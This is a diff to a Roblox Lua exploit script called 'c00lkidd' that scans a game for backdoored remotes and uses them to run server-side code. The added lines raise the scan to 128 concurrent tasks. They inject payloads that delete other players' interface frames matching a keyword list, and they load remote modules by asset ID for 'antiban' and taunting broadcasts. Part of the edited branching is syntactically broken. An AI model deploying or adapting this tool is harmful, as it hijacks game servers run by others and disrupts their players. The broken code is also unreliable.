@@ -1,7 +1,7 @@
-local function notify(text,duration)
-			game.StarterGui:SetCore("SendNotification",{
+local function notify(title,duration)
+		game.StarterGui:SetCore("SendNotification",{
 			Title = "c00lkidd",
-			Text = text,
+			Text = title,
 			Duration = duration or 5
 		})
 end
@@ -2337,7 +2337,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 		print(string.format("c00lkidd SS: scanning %d remotes", #remotes))
 	
-		local MAX_CONCURRENT = 64
+		local MAX_CONCURRENT = 128
 		local activeTasks = 0
 		local taskDone = Instance.new("BindableEvent")
 	
@@ -2380,13 +2380,9 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if remoteEvent then
 			remoteEvent:FireServer(code)
 		elseif remoteFunction and remoteFunction:InvokeServer('starlightTSS', code) then
-		   pcall(function()
 			remoteFunction:InvokeServer('starlightTSS', code)
 		    else
 			remoteFunction:InvokeServer(code)
-		   end)
-		else
-		    notify("Inject first! - or no backdoor")
 	         end
 	     end
 	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
@@ -2530,14 +2526,14 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if remoteEvent or remoteFunction then
 			script.Parent.Framee.Check.Visible = false
 			script.Parent.Framee.Log.Visible = true
-			script.Parent.Framee.Log.Text = "[Backdoor :" .. (remoteEvent or remoteFunction or "Unidentified") .. "]," .. "[" .. (remoteEvent.Name or remoteFunction.Name or "Unknown") "]"
+			script.Parent.Framee.Log.Text = "[Backdoor :" .. (remoteEvent or remoteFunction or "Unidentified") .. "]," .. "[" .. (remoteEvent.Name or remoteFunction.Name or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
 			game.StarterGui:SetCore("SendNotification",{
 			Title = "c00lkidd",
 			Text = "Backdoor: " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
 			Duration = 4
 		})
-	        fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","polaria","ranker","java1","darklord","pracharatbampen","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={["greguiscool"]=true}local function isSuspicious(str)str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local c=p.Parent return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name local t=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(n)or isSuspicious(t)then local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then local h=Instance.new("Hint",workspace)h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)")task.delay(3,function()h:Destroy()end)f:Destroy()end end end end for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end)task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end task.wait(5)end end)')
+	        fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={["greguiscool"]=true}local function isSuspicious(str)str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local c=p.Parent return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name local t=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(n)or isSuspicious(t)then local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then local h=Instance.new("Hint",workspace)h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)")task.delay(3,function()h:Destroy()end)f:Destroy()end end end end for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end)task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end task.wait(5)end end)')
                 fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 		fireRemoteEvent('require(7458325257).antiban()')
                 fireRemoteEvent('require(3986243232).load("Guys i am skid im happy to announce!",{"' .. game.Players.LocalPlayer.Name ..  '"})')
